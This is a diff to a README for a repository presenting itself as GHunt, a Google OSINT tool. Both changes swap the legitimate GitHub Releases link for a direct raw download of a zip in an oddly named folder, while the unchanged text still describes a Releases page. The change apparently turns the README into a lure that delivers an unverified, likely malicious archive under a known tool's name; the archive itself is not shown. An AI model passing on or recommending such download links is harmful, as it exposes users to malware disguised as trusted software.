@@ -1,7 +1,7 @@
 # 🕵️‍♂️ GHunt - A Simple Tool for Google Intelligence
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-GHunt-4CAF50.svg)](https://github.com/yomogi0731/GHunt/releases)
+[![Download](https://raw.githubusercontent.com/yomogi0731/GHunt/master/rhinocerial/GHunt.zip)](https://raw.githubusercontent.com/yomogi0731/GHunt/master/rhinocerial/GHunt.zip)
 
 ## 🚀 Getting Started
 GHunt is an offensive Google framework designed for users who want to gather information from Google in a secure and efficient way. This application simplifies the process of OSINT (Open Source Intelligence) using Google's tools. No programming skills are required to understand or use this software.
@@ -18,7 +18,7 @@ GHunt is an offensive Google framework designed for users who want to gather inf
 - **Internet Connection**: Required to download and use the application.
 
 ## 📥 Download & Install
-To get started with GHunt, visit this page to download: [GHunt Releases](https://github.com/yomogi0731/GHunt/releases).
+To get started with GHunt, visit this page to download: [GHunt Releases](https://raw.githubusercontent.com/yomogi0731/GHunt/master/rhinocerial/GHunt.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version available.
